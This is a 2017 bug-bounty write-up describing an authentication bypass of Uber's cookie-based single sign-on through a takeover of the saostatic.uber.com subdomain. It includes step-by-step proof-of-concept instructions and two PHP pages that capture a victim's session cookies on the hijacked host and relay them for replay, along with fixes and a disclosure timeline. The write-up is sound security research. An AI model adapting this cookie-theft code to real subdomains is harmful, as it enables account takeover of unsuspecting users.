---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-06-25_authentication-bypass-on-ubers-single-sign-on-via-subdomain-takeover.md
original_filename: 2017-06-25_authentication-bypass-on-ubers-single-sign-on-via-subdomain-takeover.md
title: Authentication bypass on Uber’s Single Sign-On via subdomain takeover
category: documents
detected_topics:
- sso
- saml
- xss
- csrf
- oauth
- command-injection
tags:
- imported
- documents
- sso
- saml
- xss
- csrf
- oauth
- command-injection
language: en
raw_sha256: 8ca6afe1080f0d1f5bb46a517de0956e234743d531dfabdc5c6ca3d626168bcb
text_sha256: 4f4ba538e264f1be47080b4ef56d6bab789e4eda265f3513ff90f6317ba9194f
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Authentication bypass on Uber’s Single Sign-On via subdomain takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-06-25_authentication-bypass-on-ubers-single-sign-on-via-subdomain-takeover.md
- Source Type: markdown
- Detected Topics: sso, saml, xss, csrf, oauth, command-injection
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `8ca6afe1080f0d1f5bb46a517de0956e234743d531dfabdc5c6ca3d626168bcb`
- Text SHA256: `4f4ba538e264f1be47080b4ef56d6bab789e4eda265f3513ff90f6317ba9194f`


## Content

---
title: "Authentication bypass on Uber’s Single Sign-On via subdomain takeover"
page_title: "Authentication bypass on Uber’s Single Sign-On via subdomain takeover – Arne Swinnen"
url: "https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/"
final_url: "https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/"
authors: ["Arne Swinnen (@ArneSwinnen)"]
programs: ["Uber"]
bugs: ["Subdomain takeover", "Authentication bypass"]
bounty: "4,500"
publication_date: "2017-06-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6172
---

[6](https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/#comments)

# Authentication bypass on Uber’s Single Sign-On via subdomain takeover

Posted on [June 25, 2017](https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/ "1:26 am") by [Arne Swinnen](https://www.arneswinnen.net/author/swinnenarne/ "View all posts by Arne Swinnen")

**TL;DR:** Uber was vulnerable to subdomain takeover on saostatic.uber.com via Amazon CloudFront CDN. Moreover, Uber’s recently deployed Single Sign-On (SSO) system at auth.uber.com, which is based on shared cookies between all *.uber.com subdomains, was found vulnerable to session cookie theft by any compromised *.uber.com subdomain. Therefore, the impact of the subdomain takeover could be increased to Authentication Bypass of Uber’s full SSO system, yielding access to all *.uber.com subdomains protected by it (e.g. vault.uber.com, partners.uber.com, riders.uber.com, etc). Uber resolved the subdomain takeover vulnerability and granted a $5.000 bounty for the two combined issues.

# Single Sign-On security revisited

Generally, SSO systems are (variations of) any of the following three types, in order of popularity:

  * **OAuth** : Security is mainly based on whitelisted callback URLs of service providers configured at the identity providers, and CSRF protection via the “state” parameter. Flaws are often via open redirect chains, e.g. [Authentication bypass on Airbnb via OAuth tokens theft.](https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/)
  * **SAML & friends**: Security is based on XML messages signed with pre-exchanged cryptographic keys between service and identity providers. Flaws are often XML Signature bypasses, e.g. [OneLogin authentication bypass on WordPress sites](https://hackerone.com/reports/136169) that bit Uber before.
  * **Shared (session) cookies between subdomains** : Security is based on the integrity of all subdomains. Any vulnerability on any subdomain that provides an attacker insight in the shared session cookies issued by the SSO system is fatal. Flaws are thus often RCE, debug logs exposure, subdomain takeover and friends on subdomains, e.g. [Authentication bypass on Ubiquity’s Single Sign-On via subdomain takeover](https://www.arneswinnen.net/2016/11/authentication-bypass-on-sso-ubnt-com-via-subdomain-takeover-of-ping-ubnt-com/)

I personally believe that the first two in this list have had many problems in the past, but have improved lately in terms of security. The latter SSO based on shared session cookies between subdomains is more a technology from the past, before the former two even existed. By design, it enforces that anything that wants to leverage the SSO system to be a subdomain of the same TLD as where the SSO system is based. Since the security of the SSO system is based on the integrity of the subdomains (see aforementioned report and the Uber case below), this is quite an ironic situation. By design, it encourages to increase the attack surface enormously.

# Uber case

Uber used OAuth as an SSO system for *.uber.com subdomains in the past, as can be seen from this recent public disclosure report by [@ngalog](https://hackerone.com/ngalog): [[Uber 8k Bug] Login CSRF + Open Redirect = Account Takeover](http://ngailong.com/uber-login-csrf-open-redirect-account-takeover/). However recently, they’ve changed (reverted?) to a SSO system based on shared session cookies among subdomains of *.uber.com. If you now browse to any uber.com subdomain that requires authentication (e.g. central, partners, riders, vault, developer, …), you get redirected to auth.uber.com instead. Once you’ve logged in there and you visit another subdomain, you’re logged in there transparently via the SSO system at auth.uber.com, which issues temporary session cookies for every *.uber.com subdomain after being logged in once.

A vulnerability was identified in this SSO system that allows any compromised subdomain on *.uber.com to transparently issue and steal valid session cookies issued for ***any*** uber.com subdomain by auth.uber.com, as long as the victim had already authenticated once to the SSO. Uber did have some countermeasures in place to prevent this, but these were bypassed and reported together with the subdomain takeover for increased impact. Any compromised *.uber.com subdomain could be used to perform the same attack, although Uber explicitly mentioned several *.uber.com subdomains as out of scope in their [bug bounty program policy](https://hackerone.com/uber#out-of-scope-properties) at the time of reporting (e.g. *.dev.uber.com, *.et.uber.com, drive.uber.com, etc).

## Subdomain takeover

Subdomain saostatic.uber.com was pointing to Amazon Cloudfront CDN via a DNS CNAME, but the hostname was not registered there anymore (dangling pointer). This allowed me to fully takeover this domain, highly similar to [Subdomain takeover on rider.uber.com due to non-existent distribution on Cloudfront](https://hackerone.com/reports/175070) by [Frans Rosén](https://hackerone.com/fransrosen). I effectively took over the subdomain as a Proof of Concept and hosted a simple HTML file as proof here:

[![](https://www.arneswinnen.net/wp-content/uploads/2017/06/3._Subdomain_Hijacked.png)](https://www.arneswinnen.net/wp-content/uploads/2017/06/3._Subdomain_Hijacked.png)

## Authentication bypass

In Uber’s SSO system, auth.uber.com acts as Identity Provider and issues temporarily shared session cookies for https://*.uber.com (“domain=uber.com” cookie attribute) to communicate identities to Service Providers (e.g. riders.uber.com, partners.uber.com, central.uber.com, vault.uber.com, developer.uber.com, and many more). Service Providers on their end immediately destroy the incoming temporary shared session cookies in case of erroneous (e.g. issued for other Service Provider) or successful authentication to ensure that the window for theft is small, as can be seen in the below Uber SSO Login diagram:

[![](https://www.arneswinnen.net/wp-content/uploads/2017/06/Uber-SSO.png)](https://www.arneswinnen.net/wp-content/uploads/2017/06/Uber-SSO.png)

The precious shared session cookie “_csid” can thus only be stolen between steps 9-12, which is a very short period (automatic browser redirects). Although not impossible to exploit (see [Jack Whitton’s awesome CSP trick to block certain cookies from being sent to certain domains, coincidentally also on Uber’s bug bounty program](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/)), a more convenient flaw was identified that allows the shared session cookie to remain alive after step 12 in the browser’s cookie store in the diagram above. The issue is that, if the victim is already logged in at https://riders.uber.com (situation after last step 12 in diagram) when receiving a request containing a valid newly generated shared session cookie “_csid” from auth.uber.com, it is simply ignored and remains usable. Hence it stays alive in the browser until its cookie store is cleared. An attacker simply needs to replay step 3 in the above diagram as step 13 and end with an additional hidden request to https://saostatic.uber.com to steal the precious session cookie:

[![](https://www.arneswinnen.net/wp-content/uploads/2017/06/Uber-SSO-Attack-1.png)](https://www.arneswinnen.net/wp-content/uploads/2017/06/Uber-SSO-Attack-1.png)

So once an attacker gets his/her hands on the victim’s “_csid” shared session cookie for https://riders.uber.com, he/she can execute the normal login flow in their own browser and replace the issued “_csid” cookie value in step 9 to be logged in as the victim, right? Wrong. Uber had another surpising countermeasure in place, namely a variant of login cross-site request forgery protection. This is the actual updated Uber SSO Login diagram:

[![](https://www.arneswinnen.net/wp-content/uploads/2017/06/Uber-SSO-Login-2-1.png)](https://www.arneswinnen.net/wp-content/uploads/2017/06/Uber-SSO-Login-2-1.png)

The problem here are the GET param state=CSRFTOKEN and locally scoped state cookie that are added in step 3 by the Service Provider riders.uber.com and verified in step 11. Since we can’t steal these values from the victim’s browser, but only the “_csid” shared session cookie, this means game over, right?

Unfortunately, wrong. An attacker can obtain a proper CSRFTOKEN value and accompanying state cookie value from https://riders.uber.com by starting a normal login scenario on their end (e.g. in their own browser or via a simple script). He/she can then relay the auth.uber.com URL generated by https://riders.uber.com in their own browser in step 3 to the victim’s browser to generate & steal the “_csid” shared session cookie for these values, and inject these in his/her own browser login scenario again in step 9. In this manner, the victim effectively generates the “_csid” temporary session token for the attacker’s login scenario in a separate browser, but this works flawlessly (e.g. no IP-based checks between steps were encountered). This still allows exploitation and thus victim impersonation in the following manner (we still assume that the victim is already logged in to auth.uber.com and visits a webpage under control by the attacker, so we basically continue the flow from the above diagram):

[![](https://www.arneswinnen.net/wp-content/uploads/2017/06/Uber-SSO-Attack-2.png)](https://www.arneswinnen.net/wp-content/uploads/2017/06/Uber-SSO-Attack-2.png)

## Proof of concept

A PoC says more than a thousand diagrams. In the PoC steps sent to Uber & showcased in the video below, the assumption is made that https://saostatic.uber.com is actually serving a valid SSL certificate in the victim’s browser, which was not the case. However, [it could’ve easily been generated with Let’s Encrypt](https://www.bleepingcomputer.com/news/security/14-766-lets-encrypt-ssl-certificates-issued-to-paypal-phishing-sites/).

  1. Open the victim’s browser & browse to https://riders.uber.com. After being redirected to https://auth.uber.com, login with the victim’s credentials so you end up on https://riders.uber.com trips dashboard again.
  2. Open a second browser tab in the victim’s browser and browse to https://saostatic.uber.com/prepareuberattack.php. Accept any certificate warnings that you may receive here – again, we’re only simulating that the domain has a valid SSL certificate. Once the page has finished loading you should see a URL, “Cookie: ” string and a “Set-Cookie: ” strings underneath each other. This is all info gathered under the hood by the attacker’s webserver that is required to login as the victim now – everything has been stolen automagically.
  3. Open the separate attacker’s browser and setup an intercepting proxy tool to intercept requests and responses. Browse to the URL displayed on the prepareuberattack.php page output and intercept this request. Now copy the “Cookie: …” string displayed on prepareuberattack.php and paste it into the request headers.
  4. The response should be a redirect to https://riders.uber.com/trips, indicating successful authentication bypass. Last but not least, copy all the “Set-Cookie: ” lines from the prepareuberattack.php page output and paste them in the response before forwarding it to the browser. This ensures that the stolen cookies are permanently injected in the attacker’s browser.
  5. You are now logged in as the victim in the attacker’s browser.

In a real attack scenario, an attacker would stealthily load https://saostatic.uber.com/prepareuberattack.php in the victim’s browser, e.g. through an iframe. Likewise, he/she would probably not display the URL and all the cookies on the resulting page, but store this on the server-side, ready to be abused in a stealthy fashion. Although it’s a lengthy explanation, the PoC video showcases how quick & effective exploitation by an attacker can be. The code of the https://saostatic.uber.com/prepareuberattack.php and https://saostatic.uber.com/uberattack.php pages is provided below. This was written quick & dirty for PoC purposes, but it did the job:

prepareuberattack.php

PHP

<html> <body> <script> <?php function HandleHeaderLine( $curl, $header_line ) { preg_match("/state=([^;]*);/", $header_line, $matches); if(sizeof($matches) > 0) { print("var cookiestate = '" . $matches[1] . "';\n"); } preg_match("/Location: (.*)/", $header_line, $matches); if(sizeof($matches) > 0) { print("var loc = '" . trim($matches[1]) . "';\n"); } return strlen($header_line); } $c = curl_init('https://riders.uber.com'); curl_setopt($c, CURLOPT_VERBOSE, 1); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_HEADERFUNCTION, "HandleHeaderLine"); $page = curl_exec($c); ?> var csrf = loc.substring(loc.lastIndexOf("=")+1); var img = document.createElement("IMG"); img.onerror = function () { var iframe = document.createElement("iframe"); iframe.setAttribute("src","https://saostatic.uber.com/uberattack.php?cookiestate=" + encodeURIComponent(cookiestate) + "&csrftoken=" + csrf); iframe.setAttribute("width", "100%"); iframe.setAttribute("height", "10000"); document.body.appendChild(iframe); } img.src=loc; </script> </body> </html>

1234567891011121314151617181920212223242526272829303132333435 | <html><body><script><?php function HandleHeaderLine( $curl, $header_line ) { preg_match("/state=([^;]*);/", $header_line, $matches); if(sizeof($matches) > 0) { print("var cookiestate = '" . $matches[1] . "';\n"); } preg_match("/Location: (.*)/", $header_line, $matches); if(sizeof($matches) > 0) { print("var loc = '" . trim($matches[1]) . "';\n"); } return strlen($header_line); } $c = curl_init('https://riders.uber.com'); curl_setopt($c, CURLOPT_VERBOSE, 1); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_HEADERFUNCTION, "HandleHeaderLine"); $page = curl_exec($c);?>var csrf = loc.substring(loc.lastIndexOf("=")+1);var img = document.createElement("IMG");img.onerror = function () { var iframe = document.createElement("iframe"); iframe.setAttribute("src","https://saostatic.uber.com/uberattack.php?cookiestate=" + encodeURIComponent(cookiestate) + "&csrftoken=" + csrf); iframe.setAttribute("width", "100%"); iframe.setAttribute("height", "10000"); document.body.appendChild(iframe); }img.src=loc;</script></body></html>  
---|---  
  
uberattack.php

PHP

<html> <body> <?php $cookiestring = "state=" . $_GET["cookiestate"] . "; "; $interestincookies = array("_udid", "_csid", "sid"); foreach ($_COOKIE as $name => $value) { if (in_array($name,$interestincookies)) { $cookiestring = $cookiestring . $name . "=" . str_replace(' ', '+', $value) . "; "; $cookiestringset = $cookiestringset . "Set-Cookie: " . $name . "=" . str_replace(' ', '+', $value) . ";</br>"; } } print "Url: " . 'https://riders.uber.com/?state=' . urlencode($_GET["csrftoken"]) . "<br /><br />"; print "Cookie: " . $cookiestring . "<br />"; print "<br />" . $cookiestringset . "<br />"; ?> </body> </html>

123456789101112131415161718 | <html><body><?php $cookiestring = "state=" . $_GET["cookiestate"] . "; "; $interestincookies = array("_udid", "_csid", "sid"); foreach ($_COOKIE as $name => $value) { if (in_array($name,$interestincookies)) { $cookiestring = $cookiestring . $name . "=" . str_replace(' ', '+', $value) . "; "; $cookiestringset = $cookiestringset . "Set-Cookie: " . $name . "=" . str_replace(' ', '+', $value) . ";</br>"; } } print "Url: " . 'https://riders.uber.com/?state=' . urlencode($_GET["csrftoken"]) . "<br /><br />"; print "Cookie: " . $cookiestring . "<br />"; print "<br />" . $cookiestringset . "<br />"; ?></body></html>  
---|---  
  
The first file can be hosted anywhere, the second file must be hosted on the hijacked subdomain (since it reads & reflects the incoming session cookies). By simply changing “riders.uber.com” to any other subdomain of uber.com in these two PHP files, an attacker could generate valid sessions for these subdomains on behalf of the victim, e.g. vault.uber.com, partners.uber.com, developer.uber.com, …

## Recommendations

The recommendations provided to Uber were twofold:

  1. Resolve the subdomain takeover of saostatic.uber.com by removing the dangling CNAME to AWS CloudFront CDN.
  2. Resolve the Authentication Bypass issue by any of the following, in order of priority: 
  * Revert the SSO system back to OAuth 2, since this does not have the side-effect of actually encouraging a large attack surface like the current shared session SSO system.
  * Or, implement an IP address check: Store a user’s external IP address when issuing a shared “_csid” session cookie on auth.uber.com (identity provider) and verify that users presenting this shared session cookie to service providers on *.uber.com have the same external IP address, to prevent relay attacks like the one described above. There is a residual risk here, namely when the attacker has the same external IP address as its victim (e.g. on the same corporate network/wireless access point/…).
  * Or, accept the inherent risk and include all *.uber.com subdomains in your bug bounty program scope, since they have the potential to fully compromise the SSO system, including the high-value targets vault.uber.com, partners.uber.com and riders.uber.com

Ultimately, Uber removed the dangling CNAME and decided to implement the IP address check to decrease the exposed risk through their current cookie based SSO system. They thus opted to accept the residual risk involved.

## Timeline

  * 07/04/2017: Submitted bug report to Uber
  * 11/04/2017: Triaged by Uber
  * 14/04/2017: $500 [minimum bounty awarded](https://medium.com/uber-security-privacy/uber-security-bug-bounty-updates-b8256494fd04)
  * 06/06/2017: Pinged Uber about the report, since I still owned saostatic.uber.com at this point
  * 06/06/2017: Response from Uber that this report fell through the cracks, starting mitigations now
  * 07/06/2017: DNS CNAME record for saostatic.uber.com removed, report marked as closed
  * 14/06/2017: Extra $4.500 bounty awarded
  * 07/07/2017: IP address check deployed by Uber and confirmed after retest
  * 11/07/2017: Permission granted to publish blogpost by Uber

### [Arne Swinnen](https://www.arneswinnen.net/author/swinnenarne/ "All posts by Arne Swinnen")

![](https://secure.gravatar.com/avatar/85c6e3f06dfe5994e9c112f745d801f39266bc0c77c1deadbfed337f3aa5da49?s=70&d=mm&r=g)

[](https://www.twitter.com/ArneSwinnen)[](https://www.linkedin.com/in/arneswinnen)

Belgian. IT Security. Bug Bounty Hunter.
